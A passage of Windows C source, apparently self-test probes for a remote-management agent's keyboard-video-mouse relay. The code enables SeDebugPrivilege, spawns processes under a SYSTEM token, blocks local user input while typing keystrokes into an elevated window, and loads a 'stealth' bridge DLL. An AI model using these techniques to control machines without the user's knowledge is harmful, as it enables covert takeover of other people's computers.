		GetModuleFileNameW(NULL, targetExePath, (DWORD)_countof(targetExePath)) > 0 &&
		SUCCEEDED(StringCchPrintfW(
			blockerArgs,
			_countof(blockerArgs),
			L"-kvm-blockinput-holder \"%ls\" \"%ls\" \"%ls\"",
			blockerReadyPath,
			blockerReleasePath,
			blockerReportPath)))
	{
		blockerSpawned = MeshService_SpawnProcessWithTokenW(elevatedToken, blockerArgs, L"winsta0\\default", &blockerProcess, &blockerSpawnError);
	}

	if (blockerSpawned)
	{
		blockerReady = MeshService_WaitForFilePresenceW(blockerReadyPath, 10000, &blockerReadyMs);
	}
	if (blockerReady)
	{
		Sleep(500);
		inputSent = MeshService_KvmTypeMarkerVirtualText(marker, MeshService_KvmSessionChangeProbeWriteSink, &state);
	}

	if (inputSent)
	{
		targetWaitResult = WaitForSingleObject(targetProcess.hProcess, 10000);
		targetExited = (targetWaitResult == WAIT_OBJECT_0);
	}
	if (targetExited)
	{
		capturedText = MeshService_ReadUtf8TextFileW(capturePath);
		if (capturedText != NULL)
		{
			MeshService_TrimLineEndingsA(capturedText);
			capturedMatches = (strcmp(capturedText, marker) == 0);
		}
	}

	if (blockerSpawned)
	{
		blockerReleaseWritten = MeshService_WriteWideTextFileUtf8W(blockerReleasePath, L"RELEASE");
		blockerWaitResult = WaitForSingleObject(blockerProcess.hProcess, 10000);
		blockerExited = (blockerWaitResult == WAIT_OBJECT_0);
		if (!blockerExited)
		{
			TerminateProcess(blockerProcess.hProcess, 1);
			WaitForSingleObject(blockerProcess.hProcess, 2000);
			blockerWaitResult = WaitForSingleObject(blockerProcess.hProcess, 0);
			blockerExited = (blockerWaitResult == WAIT_OBJECT_0);
		}
		if (blockerExited)
		{
			GetExitCodeProcess(blockerProcess.hProcess, &blockerExitCode);
		}
		blockerJson = MeshService_ReadUtf8TextFileW(blockerReportPath);
		blockerReportAvailable = (blockerJson != NULL);
		blockerSuccess = MeshService_JsonFieldTrueA(blockerJson, "success");
		blockerBlockInputEnabled = MeshService_JsonFieldTrueA(blockerJson, "blockInputEnabled");
		blockerSameThreadSendInputSucceeded = MeshService_JsonFieldTrueA(blockerJson, "sameThreadSendInputSucceeded");
	}

	if (targetProcess.hProcess != NULL && !targetExited)
	{
		TerminateProcess(targetProcess.hProcess, 1);
		WaitForSingleObject(targetProcess.hProcess, 2000);
	}
	if (relayStarted)
	{
		kvm_cleanup(&state);
		kvm_set_force_default_desktop(0);
		if (bridgePid != 0)
		{
			cleanupExited = MeshService_WaitForProcessExitById(bridgePid, 5000, &bridgeExitMs);
		}
		else
		{
			cleanupExited = TRUE;
		}
		Sleep(250);
	}
	else
	{
		kvm_set_force_default_desktop(0);
	}

	success =
		relayStarted &&
		bridgeSpawned &&
		bridgePacketsReady &&
		bridgeUsed &&
		!fallbackUsed &&
		bridgeStateReady &&
		bridgeSystemSid &&
		bridgeIntegrityRid >= SECURITY_MANDATORY_SYSTEM_RID &&
		bridgeSessionId == sessionId &&
		elevatedTokenReady &&
		targetSpawned &&
		targetStateReady &&
		targetHighIntegrity &&
		targetSessionId == sessionId &&
		blockerSpawned &&
		blockerReady &&
		blockerReportAvailable &&
		blockerSuccess &&
		blockerBlockInputEnabled &&
		blockerSameThreadSendInputSucceeded &&
		inputSent &&
		targetExited &&
		capturedMatches &&
		blockerExited &&
		cleanupExited;

	printf("{\"success\":%s,", success ? "true" : "false");
	printf("\"phase\":\"kvm-blockinput-probe\",");
	printf("\"sessionId\":%lu,", (unsigned long)sessionId);
	printf("\"relayStarted\":%s,", relayStarted ? "true" : "false");
	printf("\"bridgeSpawned\":%s,", bridgeSpawned ? "true" : "false");
	printf("\"bridgePacketsReady\":%s,", bridgePacketsReady ? "true" : "false");
	printf("\"bridgeUsed\":%s,", bridgeUsed ? "true" : "false");
	printf("\"fallbackUsed\":%s,", fallbackUsed ? "true" : "false");
	printf("\"bridgePid\":%lu,", (unsigned long)bridgePid);
	printf("\"bridgeSpawnMs\":%lu,", (unsigned long)bridgeSpawnMs);
	printf("\"bridgePacketMs\":%lu,", (unsigned long)bridgePacketMs);
	printf("\"bridgeStateReady\":%s,", bridgeStateReady ? "true" : "false");
	printf("\"bridgeSystemSid\":%s,", bridgeSystemSid ? "true" : "false");
	printf("\"bridgeIntegrityRid\":%lu,", (unsigned long)bridgeIntegrityRid);
	printf("\"bridgeElevationType\":%lu,", (unsigned long)bridgeElevationType);
	printf("\"bridgeSessionId\":%lu,", (unsigned long)bridgeSessionId);
	printf("\"probeWindowStationBound\":%s,", probeWindowStationBound ? "true" : "false");
	printf("\"probeWindowStationError\":%lu,", (unsigned long)probeWindowStationError);
	printf("\"probeDesktopBound\":%s,", probeDesktopBound ? "true" : "false");
	printf("\"probeDesktopError\":%lu,", (unsigned long)probeDesktopError);
	printf("\"probeDesktop\":\""); MeshService_PrintJsonEscapedWide(probeDesktop); printf("\",");
	printf("\"targetDesktop\":\""); MeshService_PrintJsonEscapedWide(targetDesktop); printf("\",");
	printf("\"elevatedTokenReady\":%s,", elevatedTokenReady ? "true" : "false");
	printf("\"elevatedTokenError\":%lu,", (unsigned long)elevatedTokenError);
	printf("\"targetSpawned\":%s,", targetSpawned ? "true" : "false");
	printf("\"targetSpawnError\":%lu,", (unsigned long)targetSpawnError);
	printf("\"targetPid\":%lu,", (unsigned long)targetProcess.dwProcessId);
	printf("\"targetReady\":%s,", targetReady ? "true" : "false");
	printf("\"targetReadyMs\":%lu,", (unsigned long)targetReadyMs);
	printf("\"targetWindowReported\":%s,", targetWindowReported ? "true" : "false");
	printf("\"targetWindowReportMs\":%lu,", (unsigned long)targetWindowReportMs);
	printf("\"targetWindowFound\":%s,", targetWindowFound ? "true" : "false");
	printf("\"targetWindowMs\":%lu,", (unsigned long)targetWindowMs);
	printf("\"targetFocused\":%s,", targetFocused ? "true" : "false");
	printf("\"targetStateReady\":%s,", targetStateReady ? "true" : "false");
	printf("\"targetIntegrityRid\":%lu,", (unsigned long)targetIntegrityRid);
	printf("\"targetElevationType\":%lu,", (unsigned long)targetElevationType);
	printf("\"targetHighIntegrity\":%s,", targetHighIntegrity ? "true" : "false");
	printf("\"targetSessionId\":%lu,", (unsigned long)targetSessionId);
	printf("\"blockerSpawned\":%s,", blockerSpawned ? "true" : "false");
	printf("\"blockerSpawnError\":%lu,", (unsigned long)blockerSpawnError);
	printf("\"blockerReady\":%s,", blockerReady ? "true" : "false");
	printf("\"blockerReadyMs\":%lu,", (unsigned long)blockerReadyMs);
	printf("\"blockerReleaseWritten\":%s,", blockerReleaseWritten ? "true" : "false");
	printf("\"blockerExited\":%s,", blockerExited ? "true" : "false");
	printf("\"blockerWaitResult\":%lu,", (unsigned long)blockerWaitResult);
	printf("\"blockerExitCode\":%lu,", (unsigned long)blockerExitCode);
	printf("\"blockerReportAvailable\":%s,", blockerReportAvailable ? "true" : "false");
	printf("\"blockerSuccess\":%s,", blockerSuccess ? "true" : "false");
	printf("\"blockerBlockInputEnabled\":%s,", blockerBlockInputEnabled ? "true" : "false");
	printf("\"blockerSameThreadSendInputSucceeded\":%s,", blockerSameThreadSendInputSucceeded ? "true" : "false");
	printf("\"inputSent\":%s,", inputSent ? "true" : "false");
	printf("\"targetExited\":%s,", targetExited ? "true" : "false");
	printf("\"targetWaitResult\":%lu,", (unsigned long)targetWaitResult);
	printf("\"capturedMatches\":%s,", capturedMatches ? "true" : "false");
	printf("\"cleanupExited\":%s,", cleanupExited ? "true" : "false");
	printf("\"bridgeExitMs\":%lu,", (unsigned long)bridgeExitMs);
	printf("\"windowTitle\":\""); MeshService_PrintJsonEscapedWide(windowTitle); printf("\",");
	printf("\"windowSnapshot\":\""); MeshService_PrintJsonEscapedWide(windowSnapshot); printf("\",");
	printf("\"marker\":\""); MeshService_PrintJsonEscapedUtf8(marker); printf("\",");
	printf("\"capturedText\":\""); MeshService_PrintJsonEscapedUtf8(capturedText != NULL ? capturedText : ""); printf("\",");
	printf("\"targetExePath\":\""); MeshService_PrintJsonEscapedWide(targetExePath); printf("\",");
	printf("\"hwndReportPath\":\""); MeshService_PrintJsonEscapedWide(hwndReportPath); printf("\",");
	printf("\"readyPath\":\""); MeshService_PrintJsonEscapedWide(readyPath); printf("\",");
	printf("\"capturePath\":\""); MeshService_PrintJsonEscapedWide(capturePath); printf("\",");
	printf("\"blockerReadyPath\":\""); MeshService_PrintJsonEscapedWide(blockerReadyPath); printf("\",");
	printf("\"blockerReleasePath\":\""); MeshService_PrintJsonEscapedWide(blockerReleasePath); printf("\",");
	printf("\"blockerReportPath\":\""); MeshService_PrintJsonEscapedWide(blockerReportPath); printf("\",");
	printf("\"blocker\":%s}\n", blockerJson != NULL ? blockerJson : "null");
	fflush(stdout);

	if (blockerProcess.hThread != NULL) { CloseHandle(blockerProcess.hThread); }
	if (blockerProcess.hProcess != NULL) { CloseHandle(blockerProcess.hProcess); }
	if (targetProcess.hThread != NULL) { CloseHandle(targetProcess.hThread); }
	if (targetProcess.hProcess != NULL) { CloseHandle(targetProcess.hProcess); }
	if (elevatedToken != NULL) { CloseHandle(elevatedToken); }
	if (blockerJson != NULL) { free(blockerJson); }
	if (capturedText != NULL) { free(capturedText); }
	DeleteFileW(hwndReportPath);
	DeleteFileW(readyPath);
	DeleteFileW(capturePath);
	DeleteFileW(blockerReadyPath);
	DeleteFileW(blockerReleasePath);
	DeleteFileW(blockerReportPath);
	if (chain != NULL) { ILibStopChain(chain); }
	if (chainThread != NULL)
	{
		WaitForSingleObject(chainThread, 5000);
		CloseHandle(chainThread);
	}
	return success ? 0 : 1;
}

static int MeshService_RunKvmBlockInputProbeChildCommand(const WCHAR* reportPath)
{
	FILE* redirectedStdout = NULL;
	errno_t redirectError = 0;

	if (reportPath != NULL && reportPath[0] != L'\0')
	{
		redirectError = _wfreopen_s(&redirectedStdout, reportPath, L"wb", stdout);
		if (redirectError != 0 || redirectedStdout == NULL)
		{
			return 1;
		}
	}
	return MeshService_RunKvmBlockInputProbeWorkerCommand();
}

static int MeshService_RunKvmBlockInputProbeCommand(void)
{
	WCHAR tempPath[MAX_PATH] = { 0 };
	WCHAR reportPath[MAX_PATH] = { 0 };
	WCHAR arguments[512] = { 0 };
	HANDLE systemToken = NULL;
	PROCESS_INFORMATION childProcess;
	DWORD sessionId = MeshService_GetCurrentSessionId();
	DWORD systemTokenError = ERROR_SUCCESS;
	DWORD spawnError = ERROR_SUCCESS;
	DWORD childExitCode = STILL_ACTIVE;
	BOOL systemTokenReady = FALSE;
	BOOL childSpawned = FALSE;
	char* childJson = NULL;

	if (MeshService_ProcessHasSystemSid())
	{
		return MeshService_RunKvmBlockInputProbeWorkerCommand();
	}

	ZeroMemory(&childProcess, sizeof(childProcess));
	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
	{
		GetTempPathW((DWORD)_countof(tempPath), tempPath);
	}
	StringCchPrintfW(reportPath, _countof(reportPath), L"%lsMeshKvmBlockInputProbe_%lu.json", tempPath, GetCurrentProcessId());
	DeleteFileW(reportPath);

	MeshService_EnableNamedPrivilegeW(L"SeDebugPrivilege");
	systemTokenReady = MeshService_OpenPrimarySystemTokenForSession(sessionId, &systemToken, &systemTokenError);
	if (systemTokenReady)
	{
		StringCchPrintfW(arguments, _countof(arguments), L"-kvm-blockinput-probe-child \"%ls\"", reportPath);
		childSpawned = MeshService_SpawnProcessWithTokenW(systemToken, arguments, L"winsta0\\default", &childProcess, &spawnError);
	}
	if (childSpawned)
	{
		WaitForSingleObject(childProcess.hProcess, 60000);
		GetExitCodeProcess(childProcess.hProcess, &childExitCode);
	}

	childJson = MeshService_ReadUtf8TextFileW(reportPath);
	if (childJson != NULL)
	{
		printf("%s\n", childJson);
	}
	else
	{
		printf("{\"success\":false,\"phase\":\"kvm-blockinput-probe\",\"sessionId\":%lu,\"systemTokenReady\":%s,\"childSpawned\":%s,\"systemTokenError\":%lu,\"spawnError\":%lu,\"childExitCode\":%lu}\n",
			(unsigned long)sessionId,
			systemTokenReady ? "true" : "false",
			childSpawned ? "true" : "false",
			(unsigned long)systemTokenError,
			(unsigned long)spawnError,
			(unsigned long)childExitCode);
	}
	fflush(stdout);

	if (childProcess.hThread != NULL) { CloseHandle(childProcess.hThread); }
	if (childProcess.hProcess != NULL) { CloseHandle(childProcess.hProcess); }
	if (systemToken != NULL) { CloseHandle(systemToken); }
	if (childJson != NULL) { free(childJson); }
	DeleteFileW(reportPath);
	return (childSpawned && childExitCode == 0 && childJson != NULL) ? 0 : 1;
}

typedef struct MeshServiceKvmProbeChain
{
	void* chain;
	void* pipeManager;
	HANDLE chainThread;
} MeshServiceKvmProbeChain;

static void MeshService_KvmProbeChain_Init(MeshServiceKvmProbeChain* probeChain)
{
	if (probeChain == NULL) { return; }
	ZeroMemory(probeChain, sizeof(MeshServiceKvmProbeChain));
}

static BOOL MeshService_KvmProbeChain_Start(MeshServiceKvmProbeChain* probeChain)
{
	if (probeChain == NULL) { return FALSE; }

	probeChain->chain = ILibCreateChainEx(0);
	if (probeChain->chain == NULL) { return FALSE; }

	probeChain->pipeManager = ILibProcessPipe_Manager_Create(probeChain->chain);
	if (probeChain->pipeManager == NULL)
	{
		ILibStopChain(probeChain->chain);
		probeChain->chain = NULL;
		return FALSE;
	}

	probeChain->chainThread = CreateThread(NULL, 0, MeshService_KvmSessionChangeProbeChainThread, probeChain->chain, 0, NULL);
	if (probeChain->chainThread == NULL)
	{
		ILibStopChain(probeChain->chain);
		probeChain->pipeManager = NULL;
		probeChain->chain = NULL;
		return FALSE;
	}

	Sleep(200);
	return TRUE;
}

static DWORD MeshService_KvmProbeChain_Stop(MeshServiceKvmProbeChain* probeChain)
{
	DWORD waitResult = WAIT_OBJECT_0;

	if (probeChain == NULL) { return WAIT_OBJECT_0; }
	if (probeChain->chain != NULL)
	{
		ILibStopChain(probeChain->chain);
		probeChain->chain = NULL;
		probeChain->pipeManager = NULL;
	}
	if (probeChain->chainThread != NULL)
	{
		waitResult = WaitForSingleObject(probeChain->chainThread, 5000);
		CloseHandle(probeChain->chainThread);
		probeChain->chainThread = NULL;
	}
	return waitResult;
}

static void MeshService_RestoreEnvironmentVariableW(const WCHAR* name, const WCHAR* previousValue, DWORD previousLen)
{
	if (name == NULL || name[0] == L'\0') { return; }
	if (previousValue != NULL && previousLen > 0 && previousValue[0] != L'\0')
	{
		SetEnvironmentVariableW(name, previousValue);
	}
	else
	{
		SetEnvironmentVariableW(name, NULL);
	}
}

static BOOL MeshService_GetCurrentBuildBridgeDllPathW(WCHAR* output, size_t outputLen)
{
	WCHAR modulePath[MAX_PATH * 4] = { 0 };
	WCHAR dirPath[MAX_PATH * 4] = { 0 };
	WCHAR parentDir[MAX_PATH * 4] = { 0 };
	WCHAR baseName[MAX_PATH] = { 0 };
	WCHAR nameNoExt[MAX_PATH] = { 0 };
	WCHAR candidate[MAX_PATH * 4] = { 0 };
	WCHAR* lastSlash = NULL;
	WCHAR* ext = NULL;

	if (output == NULL || outputLen == 0) { return FALSE; }
	output[0] = L'\0';

	if (GetModuleFileNameW(NULL, modulePath, (DWORD)_countof(modulePath)) == 0) { return FALSE; }
	if (FAILED(StringCchCopyW(dirPath, _countof(dirPath), modulePath))) { return FALSE; }

	lastSlash = wcsrchr(dirPath, L'\\');
	if (lastSlash == NULL) { return FALSE; }
	if (FAILED(StringCchCopyW(baseName, _countof(baseName), lastSlash + 1))) { return FALSE; }
	*lastSlash = L'\0';

	if (FAILED(StringCchCopyW(parentDir, _countof(parentDir), dirPath))) { return FALSE; }
	lastSlash = wcsrchr(parentDir, L'\\');
	if (lastSlash == NULL) { return FALSE; }
	*lastSlash = L'\0';

	if (FAILED(StringCchCopyW(nameNoExt, _countof(nameNoExt), baseName))) { return FALSE; }
	ext = wcsrchr(nameNoExt, L'.');
	if (ext != NULL) { *ext = L'\0'; }

	if (FAILED(StringCchPrintfW(candidate, _countof(candidate), L"%ls\\StealthLab_DLL\\%ls.dll", parentDir, nameNoExt))) { return FALSE; }
	if (GetFileAttributesW(candidate) == INVALID_FILE_ATTRIBUTES) { return FALSE; }

	return SUCCEEDED(StringCchCopyW(output, outputLen, candidate));
}

static BOOL MeshService_WaitForKvmFailureCount(DWORD targetFailureCount, DWORD timeoutMs, DWORD* elapsedMsOut)
{
	ULONGLONG startTick = GetTickCount64();

	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
	while ((GetTickCount64() - startTick) <= timeoutMs)
	{
		if (kvm_bridge_debug_get_consecutive_failures() >= targetFailureCount)
		{
			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - startTick); }
			return TRUE;
		}
		Sleep(50);
	}
	if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - startTick); }
	return FALSE;
}

static int MeshService_RunKvmBridgeCrashRecoveryProbeWorkerCommand(void)
{
	static const DWORD expectedBackoffMs[6] = { 2000, 4000, 8000, 16000, 32000, 60000 };
	MeshServiceKvmProbeChain probeChain;
	MeshServiceKvmSessionChangeProbeState state;
	WCHAR bridgeDllPath[MAX_PATH * 4] = { 0 };
	WCHAR missingExePath[MAX_PATH] = { 0 };
	WCHAR tempPath[MAX_PATH] = { 0 };
	WCHAR previousBridgeDll[MAX_PATH * 4] = { 0 };
	WCHAR previousForceExitCode[64] = { 0 };
	char missingExePathA[MAX_PATH * 4] = { 0 };
	DWORD previousBridgeDllLen = 0;
	DWORD previousForceExitCodeLen = 0;
	DWORD sessionId = MeshService_GetCurrentSessionId();
	DWORD failureTimelineMs[6] = { 0 };
	DWORD recordedBackoffMs[6] = { 0 };
	DWORD failureStageSeries[6] = { 0 };
	DWORD failureErrorSeries[6] = { 0 };
	DWORD observedIntervalsMs[5] = { 0 };
	BOOL retryScheduledSeries[6] = { FALSE };
	DWORD spawnAttemptCount = 0;
	DWORD cleanupSettleMs = 0;
	DWORD chainThreadWaitResult = WAIT_OBJECT_0;
	ULONGLONG probeStartTick = 0;
	int failureCount = 0;
	int i = 0;
	BOOL bridgeDllReady = FALSE;
	BOOL chainStarted = FALSE;
	BOOL relayStarted = FALSE;
	BOOL cleanupSettled = FALSE;
	BOOL success = FALSE;

	MeshService_KvmProbeChain_Init(&probeChain);
	ZeroMemory(&state, sizeof(state));

	if (sessionId == 0 || sessionId == 0xFFFFFFFF)
	{
		printf("{\"success\":false,\"phase\":\"kvm-bridge-crash-recovery-probe\",\"sessionId\":%lu,\"error\":\"invalid-session\"}\n", (unsigned long)sessionId);
		fflush(stdout);
		return 1;
	}

	bridgeDllReady = MeshService_GetCurrentBuildBridgeDllPathW(bridgeDllPath, _countof(bridgeDllPath));
	chainStarted = MeshService_KvmProbeChain_Start(&probeChain);
	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
	{
		GetTempPathW((DWORD)_countof(tempPath), tempPath);
	}
	StringCchPrintfW(missingExePath, _countof(missingExePath), L"%lsMeshMissingKvmChild_%lu.exe", tempPath, GetCurrentProcessId());
	DeleteFileW(missingExePath);
	ILibWideToUTF8Ex(missingExePath, -1, missingExePathA, (int)sizeof(missingExePathA));

	previousBridgeDllLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", previousBridgeDll, (DWORD)_countof(previousBridgeDll));
	if (previousBridgeDllLen >= _countof(previousBridgeDll)) { previousBridgeDllLen = 0; previousBridgeDll[0] = L'\0'; }
	previousForceExitCodeLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, (DWORD)_countof(previousForceExitCode));
	if (previousForceExitCodeLen >= _countof(previousForceExitCode)) { previousForceExitCodeLen = 0; previousForceExitCode[0] = L'\0'; }

	if (bridgeDllReady)
	{
		SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", bridgeDllPath);
	}
	SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", L"193");

	if (bridgeDllReady && chainStarted)
	{
		relayStarted = (kvm_relay_setup(missingExePathA, probeChain.pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &state, (int)sessionId) != 0);
	}
	if (relayStarted)
	{
		probeStartTick = GetTickCount64();
		while (failureCount < 6 && (GetTickCount64() - probeStartTick) <= 95000)
		{
			DWORD currentFailureCount = kvm_bridge_debug_get_consecutive_failures();

			while (failureCount < 6 && currentFailureCount >= (DWORD)(failureCount + 1))
			{
				failureTimelineMs[failureCount] = (DWORD)(GetTickCount64() - probeStartTick);
				recordedBackoffMs[failureCount] = kvm_bridge_debug_get_last_backoff_delay_ms();
				failureStageSeries[failureCount] = kvm_bridge_debug_get_last_bridge_failure_stage();
				failureErrorSeries[failureCount] = kvm_bridge_debug_get_last_bridge_failure_error();
				retryScheduledSeries[failureCount] = (kvm_bridge_debug_is_retry_scheduled() != 0);
				++failureCount;
			}
			Sleep(50);
		}
		spawnAttemptCount = kvm_bridge_debug_get_spawn_attempt_count();
		kvm_cleanup(&state);
		while (cleanupSettleMs < 2000)
		{
			if (kvm_bridge_debug_get_child_present() == 0 && kvm_bridge_debug_is_retry_scheduled() == 0)
			{
				cleanupSettled = TRUE;
				break;
			}
			Sleep(50);
			cleanupSettleMs += 50;
		}
	}

	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", previousBridgeDll, previousBridgeDllLen);
	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, previousForceExitCodeLen);
	chainThreadWaitResult = MeshService_KvmProbeChain_Stop(&probeChain);

	for (i = 1; i < failureCount && i < 6; ++i)
	{
		observedIntervalsMs[i - 1] = failureTimelineMs[i] - failureTimelineMs[i - 1];
	}

	success = bridgeDllReady && chainStarted && relayStarted && failureCount == 6 && spawnAttemptCount > 0 && cleanupSettled;
	for (i = 0; i < failureCount && i < 6; ++i)
	{
		if (recordedBackoffMs[i] != expectedBackoffMs[i]) { success = FALSE; }
		if (failureStageSeries[i] != 7) { success = FALSE; }
		if (failureErrorSeries[i] != 193) { success = FALSE; }
		if (!retryScheduledSeries[i]) { success = FALSE; }
	}
	for (i = 1; i < failureCount && i < 6; ++i)
	{
		DWORD lowerBound = (expectedBackoffMs[i - 1] > 250) ? (expectedBackoffMs[i - 1] - 250) : 0;
		DWORD upperBound = expectedBackoffMs[i - 1] + 5000;
		if (observedIntervalsMs[i - 1] < lowerBound || observedIntervalsMs[i - 1] > upperBound)
		{
			success = FALSE;
		}
	}

	printf("{\"success\":%s,", success ? "true" : "false");
	printf("\"phase\":\"kvm-bridge-crash-recovery-probe\",");
	printf("\"sessionId\":%lu,", (unsigned long)sessionId);
	printf("\"bridgeDllReady\":%s,", bridgeDllReady ? "true" : "false");
	printf("\"chainStarted\":%s,", chainStarted ? "true" : "false");
	printf("\"relayStarted\":%s,", relayStarted ? "true" : "false");
	printf("\"bridgeDllPath\":\""); MeshService_PrintJsonEscapedWide(bridgeDllPath); printf("\",");
	printf("\"missingExePath\":\""); MeshService_PrintJsonEscapedWide(missingExePath); printf("\",");
	printf("\"failureCount\":%d,", failureCount);
	printf("\"spawnAttemptCount\":%lu,", (unsigned long)spawnAttemptCount);
	printf("\"cleanupSettled\":%s,", cleanupSettled ? "true" : "false");
	printf("\"cleanupSettleMs\":%lu,", (unsigned long)cleanupSettleMs);
	printf("\"chainThreadWaitResult\":%lu,", (unsigned long)chainThreadWaitResult);
	printf("\"expectedBackoffMs\":[");
	for (i = 0; i < 6; ++i)
	{
		if (i != 0) { printf(","); }
		printf("%lu", (unsigned long)expectedBackoffMs[i]);
	}
	printf("],");
	printf("\"recordedBackoffMs\":[");
	for (i = 0; i < 6; ++i)
	{
		if (i != 0) { printf(","); }
		printf("%lu", (unsigned long)recordedBackoffMs[i]);
	}
	printf("],");
	printf("\"failureTimelineMs\":[");
	for (i = 0; i < 6; ++i)
	{
		if (i != 0) { printf(","); }
		printf("%lu", (unsigned long)failureTimelineMs[i]);
	}
	printf("],");
	printf("\"observedIntervalsMs\":[");
	for (i = 0; i < 5; ++i)
	{
		if (i != 0) { printf(","); }
		printf("%lu", (unsigned long)observedIntervalsMs[i]);
	}
	printf("],");
	printf("\"failureStageSeries\":[");
	for (i = 0; i < 6; ++i)
	{
		if (i != 0) { printf(","); }
		printf("%lu", (unsigned long)failureStageSeries[i]);
	}
	printf("],");
	printf("\"failureErrorSeries\":[");
	for (i = 0; i < 6; ++i)
	{
		if (i != 0) { printf(","); }
		printf("%lu", (unsigned long)failureErrorSeries[i]);
	}
	printf("],");
	printf("\"retryScheduledSeries\":[");
	for (i = 0; i < 6; ++i)
	{
		if (i != 0) { printf(","); }
		printf("%s", retryScheduledSeries[i] ? "true" : "false");
	}
	printf("]}\n");
	fflush(stdout);
	return success ? 0 : 1;
}

static int MeshService_RunKvmBridgeCrashRecoveryProbeChildCommand(const WCHAR* reportPath)
{
	FILE* redirectedStdout = NULL;
	errno_t redirectError = 0;

	if (reportPath != NULL && reportPath[0] != L'\0')
	{
		redirectError = _wfreopen_s(&redirectedStdout, reportPath, L"wb", stdout);
		if (redirectError != 0 || redirectedStdout == NULL)
		{
			return 1;
		}
	}
	return MeshService_RunKvmBridgeCrashRecoveryProbeWorkerCommand();
}

static int MeshService_RunKvmBridgeCrashRecoveryProbeCommand(void)
{
	WCHAR tempPath[MAX_PATH] = { 0 };
	WCHAR reportPath[MAX_PATH] = { 0 };
	WCHAR arguments[512] = { 0 };
	HANDLE systemToken = NULL;
	PROCESS_INFORMATION childProcess;
	DWORD sessionId = MeshService_GetCurrentSessionId();
	DWORD systemTokenError = ERROR_SUCCESS;
	DWORD spawnError = ERROR_SUCCESS;
	DWORD childExitCode = STILL_ACTIVE;
	BOOL systemTokenReady = FALSE;
	BOOL childSpawned = FALSE;
	char* childJson = NULL;

	if (MeshService_ProcessHasSystemSid())
	{
		return MeshService_RunKvmBridgeCrashRecoveryProbeWorkerCommand();
	}

	ZeroMemory(&childProcess, sizeof(childProcess));
	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
	{
		GetTempPathW((DWORD)_countof(tempPath), tempPath);
	}
	StringCchPrintfW(reportPath, _countof(reportPath), L"%lsMeshKvmCrashRecoveryProbe_%lu.json", tempPath, GetCurrentProcessId());
	DeleteFileW(reportPath);

	MeshService_EnableNamedPrivilegeW(L"SeDebugPrivilege");
	systemTokenReady = MeshService_OpenPrimarySystemTokenForSession(sessionId, &systemToken, &systemTokenError);
	if (systemTokenReady)
	{
		StringCchPrintfW(arguments, _countof(arguments), L"-kvm-bridge-crash-recovery-probe-child \"%ls\"", reportPath);
		childSpawned = MeshService_SpawnProcessWithTokenW(systemToken, arguments, L"winsta0\\default", &childProcess, &spawnError);
	}
	if (childSpawned)
	{
		WaitForSingleObject(childProcess.hProcess, 150000);
		GetExitCodeProcess(childProcess.hProcess, &childExitCode);
	}

	childJson = MeshService_ReadUtf8TextFileW(reportPath);
	if (childJson != NULL)
	{
		printf("%s\n", childJson);
	}
	else
	{
		printf("{\"success\":false,\"phase\":\"kvm-bridge-crash-recovery-probe\",\"sessionId\":%lu,\"systemTokenReady\":%s,\"childSpawned\":%s,\"systemTokenError\":%lu,\"spawnError\":%lu,\"childExitCode\":%lu}\n",
			(unsigned long)sessionId,
			systemTokenReady ? "true" : "false",
			childSpawned ? "true" : "false",
			(unsigned long)systemTokenError,
			(unsigned long)spawnError,
			(unsigned long)childExitCode);
	}
	fflush(stdout);

	if (childProcess.hThread != NULL) { CloseHandle(childProcess.hThread); }
	if (childProcess.hProcess != NULL) { CloseHandle(childProcess.hProcess); }
	if (systemToken != NULL) { CloseHandle(systemToken); }
	if (childJson != NULL) { free(childJson); }
	DeleteFileW(reportPath);
	return (childSpawned && childExitCode == 0 && childJson != NULL) ? 0 : 1;
}

static int MeshService_RunKvmBridgeEventAuditProbeWorkerCommand(void)
{
	MeshServiceKvmProbeChain probeChain;
	MeshServiceKvmSessionChangeProbeState state;
	WCHAR bridgeDllPath[MAX_PATH * 4] = { 0 };
	WCHAR serviceNameBuf[256] = { 0 };
	WCHAR missingExePath[MAX_PATH] = { 0 };
	WCHAR tempPath[MAX_PATH] = { 0 };
	WCHAR previousBridgeDll[MAX_PATH * 4] = { 0 };
	WCHAR previousForceExitCode[64] = { 0 };
	char exePath[MAX_PATH * 4] = { 0 };
	char missingExePathA[MAX_PATH * 4] = { 0 };
	DWORD previousBridgeDllLen = 0;
	DWORD previousForceExitCodeLen = 0;
	DWORD sessionId = MeshService_GetCurrentSessionId();
	DWORD successBridgePid = 0;
	DWORD successBridgeSpawnMs = 0;
	DWORD successBridgePacketMs = 0;
	DWORD successCleanupExitMs = 0;
	DWORD failureWaitMs = 0;
	DWORD failureCount = 0;
	DWORD failureDelayMs = 0;
	DWORD failureStage = 0;
	DWORD failureError = 0;
	DWORD failureSpawnAttempts = 0;
	DWORD chainThreadWaitResult = WAIT_OBJECT_0;
	BOOL bridgeDllReady = FALSE;
	BOOL serviceNameReady = FALSE;
	BOOL chainStarted = FALSE;
	BOOL successRelayStarted = FALSE;
	BOOL successBridgeSpawned = FALSE;
	BOOL successBridgePacketsReady = FALSE;
	BOOL successBridgeUsed = FALSE;
	BOOL successFallbackUsed = FALSE;
	BOOL successCleanupExited = FALSE;
	BOOL failureRelayStarted = FALSE;
	BOOL failureObserved = FALSE;
	BOOL failureRetryScheduled = FALSE;
	BOOL success = FALSE;

	MeshService_KvmProbeChain_Init(&probeChain);
	ZeroMemory(&state, sizeof(state));

	if (sessionId == 0 || sessionId == 0xFFFFFFFF)
	{
